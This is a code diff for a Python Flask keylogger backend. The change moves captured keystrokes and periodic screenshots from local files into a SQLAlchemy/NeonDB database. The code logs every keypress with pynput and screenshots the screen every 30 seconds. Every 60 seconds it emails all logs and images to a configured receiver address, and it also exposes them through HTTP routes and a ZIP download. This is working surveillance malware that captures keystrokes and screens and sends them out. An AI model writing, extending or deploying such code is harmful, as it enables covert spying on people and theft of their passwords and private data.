@@ -6,36 +6,29 @@ import smtplib
 import pynput
 import jwt
 import json
-import mimetypes
 from sqlalchemy import text
 import zipfile
 from dotenv import load_dotenv
 from flask_cors import CORS
 from email.message import EmailMessage
-from flask import Flask, request, jsonify, send_from_directory,  send_file
+from flask import Flask, request, jsonify, send_file
 from flask_sqlalchemy import SQLAlchemy
-
+import io
 
 CLERK_JWT_PUBLIC_KEY = os.getenv("CLERK_JWT_PUBLIC_KEY")
 CLERK_API_URL = "https://api.clerk.dev/v1"
-
 
 # loading vars and so
 load_dotenv()
 CONFIG_FILE = "config.json"
 
-
-#app and cors setup
+# app and cors setup
 app = Flask(__name__)
 CORS(app)
 
-
 app.config["SQLALCHEMY_DATABASE_URI"] = os.getenv("SQLALCHEMY_DATABASE_URI")
 app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
-
-
 db = SQLAlchemy(app)
-
 
 # Email Configuration
 SMTP_SERVER = "smtp.gmail.com"
@@ -46,20 +39,17 @@ reciever_mail = os.getenv("RECIEVER_EMAIL")
 email_interval = 60
 screenshot_interval = 30
 
-
 # Monitoring Variables
 monitoring = False
 monitoring_thread = None
 keystroke_data = []
 keylog_listener = None
 
-
 # File Paths
 LOG_FOLDER = "./logs"
 LOG_FILE = os.path.join(LOG_FOLDER, "keylogs.txt")
 SCREENSHOT_FOLDER = os.path.join(LOG_FOLDER, "screenshots")
 ZIP_FILE = "keylogger_logs.zip"
-
 
 def load_config():
     if not os.path.exists(CONFIG_FILE):
@@ -77,11 +67,9 @@ def load_config():
     with open(CONFIG_FILE, "r") as f:
         return json.load(f)
 
-
 def save_config(config):
     with open(CONFIG_FILE, "w") as f:
         json.dump(config, f, indent=4)
-
 
 @app.route("/get_settings", methods=["GET"])
 def get_settings():
@@ -114,14 +102,11 @@ def update_settings():
         if "receiver_mail" in data:
             config["receiver_mail"] = data["receiver_mail"]
 
-
         save_config(config)
         return jsonify({"message": "Settings updated successfully", "settings": config})
 
     except Exception as e:
         return jsonify({"error": str(e)}), 500
-
-
 
 def ensure_directories():
     if not os.path.exists(LOG_FOLDER):
@@ -131,21 +116,34 @@ def ensure_directories():
     if not os.path.exists(LOG_FILE):
         open(LOG_FILE, "w").close()
 
-
-
 def capture_screenshot():
-    screenshot_path = os.path.join(SCREENSHOT_FOLDER, f"screenshot_{int(time.time())}.png")
-    pyautogui.screenshot().save(screenshot_path)
-    return screenshot_path
+    try:
+        screenshot = pyautogui.screenshot()
+        screenshot_bytes = io.BytesIO()
+        screenshot.save(screenshot_bytes, format='PNG')
+        screenshot_bytes = screenshot_bytes.getvalue()
 
+        # Save screenshot to the database within application context
+        with app.app_context():
+            new_screenshot = Screenshot(image_data=screenshot_bytes)
+            db.session.add(new_screenshot)
+            db.session.commit()
+
+        return True
+    except Exception as e:
+        print(f"❌ Screenshot Error: {e}")
+        return False
 
 def on_press(key):
     try:
         key_text = key.char if hasattr(key, 'char') else str(key)
         log_entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key_text}\n"
 
-        with open(LOG_FILE, "a") as log_file:
-            log_file.write(log_entry)
+        # Ensure database operations are performed within the application context
+        with app.app_context():
+            new_keylog = Keylog(keystrokes=log_entry)
+            db.session.add(new_keylog)
+            db.session.commit()
 
     except Exception as e:
         print(f"❌ Keylogger Error: {e}")
@@ -164,20 +162,17 @@ def send_email_report():
         msg["To"] = reciever_mail
         msg.set_content("Attached are the latest keystroke logs and screenshots.")
 
-        # Attach keylogs
-        if os.path.exists(LOG_FILE):
-            with open(LOG_FILE, "rb") as f:
-                msg.add_attachment(f.read(), maintype="text", subtype="plain", filename="keystrokes.txt")
+        # Fetch keylogs and screenshots within application context
+        with app.app_context():
+            # Attach keylogs from the database
+            keystrokes = db.session.query(Keylog).order_by(Keylog.timestamp).all()
+            keystrokes_data = "\n".join([log.keystrokes for log in keystrokes])
+            msg.add_attachment(keystrokes_data.encode(), maintype="text", subtype="plain", filename="keystrokes.txt")
 
-        # Attach screenshots
-        if os.path.exists(SCREENSHOT_FOLDER):
-            for filename in sorted(os.listdir(SCREENSHOT_FOLDER)):
-                filepath = os.path.join(SCREENSHOT_FOLDER, filename)
-                if filename.endswith(".png"):
-                    ctype, _ = mimetypes.guess_type(filepath)
-                    maintype, subtype = ctype.split("/", 1) if ctype else ("application", "octet-stream")
-                    with open(filepath, "rb") as f:
-                        msg.add_attachment(f.read(), maintype=maintype, subtype=subtype, filename=filename)
+            # Attach screenshots from the database
+            screenshots = db.session.query(Screenshot).order_by(Screenshot.timestamp).all()
+            for screenshot in screenshots:
+                msg.add_attachment(screenshot.image_data, maintype="image", subtype="png", filename=f"screenshot_{screenshot.id}.png")
 
         # Send Email
         with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
@@ -190,11 +185,16 @@ def send_email_report():
         print(f"❌ Email Error: {e}")
 
 
-# Serve screenshot images from the screenshots folder
-@app.route('/screenshots/<filename>')
-def get_screenshot(filename):
-    return send_from_directory(SCREENSHOT_FOLDER, filename)
-
+@app.route('/screenshots/<int:screenshot_id>')
+def get_screenshot(screenshot_id):
+    try:
+        screenshot = db.session.query(Screenshot).filter(Screenshot.id == screenshot_id).first()
+        if screenshot:
+            return send_file(io.BytesIO(screenshot.image_data), mimetype='image/png')
+        else:
+            return jsonify({"error": "Screenshot not found"}), 404
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 def monitor_activity():
     global monitoring, keylog_listener
@@ -212,14 +212,15 @@ def monitor_activity():
 
             # Screenshots at intervals
             if time.time() - last_screenshot_time >= screenshot_interval:
-                capture_screenshot()
+                with app.app_context():  # Ensure application context
+                    capture_screenshot()
                 last_screenshot_time = time.time()
 
             # Email at intervals
             if time.time() - last_email_time >= email_interval:
-                send_email_report()
+                with app.app_context():  # Ensure application context
+                    send_email_report()
                 last_email_time = time.time()
-
 
 def verify_clerk_token(token):
     try:
@@ -230,7 +231,7 @@ def verify_clerk_token(token):
         return None
     except jwt.InvalidTokenError:
         return None
-    
+
 @app.route("/protected", methods=["GET"])
 def protected_route():
     auth_header = request.headers.get("Authorization")
@@ -244,7 +245,6 @@ def protected_route():
         return jsonify({"error": "Invalid Token"}), 401
 
     return jsonify({"message": "Authenticated", "user": user_data})
-
 
 @app.route('/start_monitoring', methods=['POST'])
 def start_monitoring():
@@ -260,28 +260,21 @@ def start_monitoring():
 
     return jsonify({'message': 'Monitoring started'}), 200
 
-    
-    
 @app.route('/get_logs', methods=['GET'])
 def get_logs():
     try:
-        # Read keystrokes logs
-        keystrokes = []
-        keystrokes_file = os.path.join(LOG_FOLDER, "keylogs.txt")
-        if os.path.exists(keystrokes_file):
-            with open(keystrokes_file, "r") as file:
-                keystrokes = file.readlines()
+        # Fetch keystrokes from the database
+        keystrokes = db.session.query(Keylog).order_by(Keylog.timestamp).all()
+        keystrokes_data = [log.keystrokes for log in keystrokes]
 
-        # Get list of screenshots
-        screenshots = []
-        if os.path.exists(SCREENSHOT_FOLDER):
-            screenshots = [f"http://127.0.0.1:5000/screenshots/{img}" for img in sorted(os.listdir(SCREENSHOT_FOLDER)) if img.endswith(".png")]
+        # Fetch screenshots from the database
+        screenshots = db.session.query(Screenshot).order_by(Screenshot.timestamp).all()
+        screenshots_data = [f"http://127.0.0.1:5000/screenshots/{screenshot.id}" for screenshot in screenshots]
 
-        return jsonify({"keystrokes": keystrokes, "screenshots": screenshots})
+        return jsonify({"keystrokes": keystrokes_data, "screenshots": screenshots_data})
 
     except Exception as e:
         return jsonify({"error": str(e)}), 500
-
 
 @app.route('/stop_monitoring', methods=['POST'])
 def stop_monitoring():
@@ -293,7 +286,6 @@ def stop_monitoring():
     monitoring = False
     return jsonify({'message': 'Monitoring stopped'}), 200
 
-
 @app.route("/download_logs", methods=["GET"])
 def download_logs():
     """Zips all logs and screenshots, then sends the ZIP file."""
@@ -304,44 +296,46 @@ def download_logs():
 
         # Create a ZIP archive
         with zipfile.ZipFile(ZIP_FILE, "w") as zipf:
-            # Add keylog file
-            if os.path.exists(LOG_FILE):
-                zipf.write(LOG_FILE, os.path.basename(LOG_FILE))
+            # Add keylog file from the database
+            keystrokes = db.session.query(Keylog).order_by(Keylog.timestamp).all()
+            keystrokes_data = "\n".join([log.keystrokes for log in keystrokes])
+            zipf.writestr("keystrokes.txt", keystrokes_data)
 
-            # Add screenshots
-            if os.path.exists(SCREENSHOT_FOLDER):
-                for filename in sorted(os.listdir(SCREENSHOT_FOLDER)):
-                    filepath = os.path.join(SCREENSHOT_FOLDER, filename)
-                    if filename.endswith(".png"):
-                        zipf.write(filepath, os.path.join("screenshots", filename))
+            # Add screenshots from the database
+            screenshots = db.session.query(Screenshot).order_by(Screenshot.timestamp).all()
+            for screenshot in screenshots:
+                zipf.writestr(f"screenshots/screenshot_{screenshot.id}.png", screenshot.image_data)
 
         return send_file(ZIP_FILE, as_attachment=True)
 
     except Exception as e:
         return jsonify({"error": str(e)}), 500
-    
 
 class Keylog(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())
     keystrokes = db.Column(db.Text, nullable=False)
 
-
-
 class Screenshot(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())
     image_data = db.Column(db.LargeBinary, nullable=False)
 
-
-
 with app.app_context():
     try:
+        db.create_all()
         db.session.execute(text("SELECT 1 FROM keylog LIMIT 1;"))
         db.session.execute(text("SELECT 1 FROM screenshot LIMIT 1;"))
         print("✅ Connected to NeonDB. Tables exist.")
     except Exception as e:
         print(f"❌ Database Error: {e}")
+
+
+@app.route('/get_monitoring_status', methods=['GET'])
+def get_monitoring_status():
+    """Returns whether monitoring is currently active or not."""
+    return jsonify({"monitoring": monitoring})
+
 
 
 if __name__ == "__main__":
